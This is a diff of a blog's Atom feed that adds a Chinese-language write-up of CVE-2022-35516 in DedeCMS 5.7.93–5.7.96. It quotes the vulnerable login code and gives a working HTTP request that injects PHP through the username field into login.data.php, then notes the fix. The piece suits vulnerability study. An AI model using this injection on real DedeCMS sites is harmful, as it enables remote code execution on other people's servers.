@@ -6,7 +6,7 @@
   <link href="https://lamber-maybe.github.io/atom.xml" rel="self"/>
   
   <link href="https://lamber-maybe.github.io/"/>
-  <updated>2023-09-21T02:50:49.712Z</updated>
+  <updated>2023-09-26T12:32:18.598Z</updated>
   <id>https://lamber-maybe.github.io/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DedeCMS前台代码执行(CVE-2022-35516)</title>
+    <link href="https://lamber-maybe.github.io/2023/09/26/DedeCMS%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2022-35516/"/>
+    <id>https://lamber-maybe.github.io/2023/09/26/DedeCMS%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2022-35516/</id>
+    <published>2023-09-26T12:31:47.000Z</published>
+    <updated>2023-09-26T12:32:18.598Z</updated>
+    
+    <content type="html"><![CDATA[<p>影响版本: DedeCMS v5.7.93 - v5.7.96<br>漏洞产生原因: 在后台登录功能处，没有对用户名进行过滤，导致用户可以从用户名处注入恶意代码。<br>漏洞代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /dede/login.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = DEDEDATA.<span class="string">&#x27;/login.data.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 连续登录失败用户锁定  </span></span><br><span class="line"><span class="variable">$count</span> = <span class="number">1</span>;  </span><br><span class="line"><span class="variable">$timestamp</span> = <span class="title function_ invoke__">time</span>();  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$arr_login</span>[<span class="variable">$userid</span>] != <span class="string">&#x27;&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$arr_login</span>[<span class="variable">$userid</span>])[<span class="number">0</span>] + <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="variable">$fail_limit</span>) &#123;  </span><br><span class="line">        <span class="variable">$count</span> = <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$arr_login</span>[<span class="variable">$userid</span>] = <span class="string">&quot;<span class="subst">&#123;$count&#125;</span>,<span class="subst">&#123;$timestamp&#125;</span>&quot;</span>;  </span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;&lt;?php\r\n\$str_login=&#x27;&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$arr_login</span>).<span class="string">&quot;&#x27;;&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;写入文件 <span class="subst">$filename</span> 失败，请检查权限！&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$content</span>);  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure><p>就是完全没有对用户名进行过滤，还把用户名写到了 <code>login.data.php</code> 里面<br>直接构造代码注入即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /dede/login.php HTTP/1.1</span><br><span class="line">Host: dedecms5793</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=e9ag7oevkh77gnko3cdmt7mbc2</span><br><span class="line"></span><br><span class="line">dopost=login&amp;userid=\&#x27;.phpinfo();?&gt;&amp;pwd=123&amp;validate=hw0k</span><br></pre></td></tr></table></figure><p>然后访问 <code>http://example.com/data/login.data.php</code> 就可以触发注入的代码了<br>思考：</p><ol><li>该漏洞如何修复的？<br>对用户名和密码进行了过滤，并且增添了一个登录失败的处理方式</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$res</span>==-<span class="number">1</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="title function_ invoke__">ResetVdValue</span>();  </span><br><span class="line">    <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;用户名或者密码错误!&#x27;</span>,<span class="string">&#x27;login.php&#x27;</span>,<span class="number">0</span>,<span class="number">1000</span>);  </span><br><span class="line">    <span class="keyword">exit</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>还有其它类似的漏洞触发点吗？<br>没有找到。</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;影响版本: DedeCMS v5.7.93 - v5.7.96&lt;br&gt;漏洞产生原因: 在后台登录功能处，没有对用户名进行过滤，导致用户可以从用户名处注入恶意代码。&lt;br&gt;漏洞代码&lt;/p&gt;
+&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>Ubuntu22.04搭建LAMP环境</title>
